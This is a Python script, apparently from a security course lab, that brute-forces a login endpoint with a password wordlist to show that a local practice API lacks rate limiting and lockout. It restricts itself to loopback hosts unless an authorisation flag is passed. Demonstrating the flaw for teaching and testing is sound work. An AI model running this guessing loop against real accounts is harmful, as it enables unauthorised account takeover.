#!/usr/bin/env python3
"""
bruteforce_login.py -- Week 4 login brute-force demonstration.

This reproduces, in a small reproducible script, what the Burp Suite Intruder
exercise does by hand: send many password guesses at /api/login for a single
email and report which one the server accepts.

It exists to (a) prove the local target has no rate limiting / lockout, and
(b) give you a repeatable artifact to attach to the Week 4 report alongside the
Burp Intruder screenshots.

SCOPE / AUTHORISATION
---------------------
Only ever point this at the local practice API shipped in this repo
(http://127.0.0.1:5000 by default). Running password-guessing tooling against
systems you do not own or have written permission to test is unlawful. The
--target flag defaults to localhost and the script refuses non-loopback hosts
unless you pass --i-have-authorisation, which you should only do for a system
you are explicitly authorised to test.

Usage:
    python bruteforce_login.py --email ben@fitnesshub.test
    python bruteforce_login.py --email ben@fitnesshub.test \\
        --wordlist wordlists/common-passwords.txt
"""

from __future__ import annotations

import argparse
import os
import sys
import time
from urllib.parse import urlparse

import requests

DEFAULT_TARGET = "http://127.0.0.1:5000"
# Resolve the default wordlist relative to this script so the demo works no
# matter which directory you launch it from.
DEFAULT_WORDLIST = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "wordlists", "common-passwords.txt"
)
LOOPBACK_HOSTS = {"127.0.0.1", "localhost", "::1"}


def is_loopback(target: str) -> bool:
    host = urlparse(target).hostname or ""
    return host in LOOPBACK_HOSTS


def load_passwords(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8") as fh:
        return [line.strip() for line in fh if line.strip() and not line.startswith("#")]


def attempt(session: requests.Session, target: str, email: str, password: str):
    """Return (status_code, matched_bool, response_json)."""
    resp = session.post(
        f"{target}/api/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    try:
        body = resp.json()
    except ValueError:
        body = {}
    matched = resp.status_code == 200 and "token" in body
    return resp.status_code, matched, body


def main() -> int:
    parser = argparse.ArgumentParser(description="Login brute-force demo (local target only).")
    parser.add_argument("--email", required=True, help="Account email to target.")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Base URL of the API.")
    parser.add_argument("--wordlist", default=DEFAULT_WORDLIST, help="Password list file.")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay (s) between attempts.")
    parser.add_argument(
        "--i-have-authorisation",
        action="store_true",
        help="Required to target any non-loopback host you are authorised to test.",
    )
    args = parser.parse_args()

    if not is_loopback(args.target) and not args.i_have_authorisation:
        print(
            "Refusing to target a non-loopback host without --i-have-authorisation.\n"
            "Only test systems you own or have explicit written permission to test.",
            file=sys.stderr,
        )
        return 2

    try:
        passwords = load_passwords(args.wordlist)
    except FileNotFoundError:
        print(f"Wordlist not found: {args.wordlist}", file=sys.stderr)
        return 2

    print(f"[*] Target : {args.target}/api/login")
    print(f"[*] Email  : {args.email}")
    print(f"[*] Guesses: {len(passwords)} from {args.wordlist}")
    print("-" * 60)

    session = requests.Session()
    start = time.time()
    found = None

    for i, password in enumerate(passwords, 1):
        try:
            status, matched, body = attempt(session, args.target, args.email, password)
        except requests.RequestException as exc:
            print(f"[!] request error on '{password}': {exc}", file=sys.stderr)
            continue

        # The verbose error messages let us classify each response -- this is
        # exactly the signal you sort Intruder results by (status / length).
        note = body.get("error") or body.get("message", "")
        flag = "  <== MATCH" if matched else ""
        print(f"[{i:>4}/{len(passwords)}] {password:<20} HTTP {status}  {note}{flag}")

        if matched:
            found = password
            break
        if args.delay:
            time.sleep(args.delay)

    elapsed = time.time() - start
    print("-" * 60)
    if found:
        print(f"[+] Password found: '{found}' in {i} attempts, {elapsed:.2f}s")
        print("[+] No lockout or rate limiting was triggered -> VULNERABLE.")
        return 0
    print(f"[-] No password matched after {len(passwords)} attempts ({elapsed:.2f}s).")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
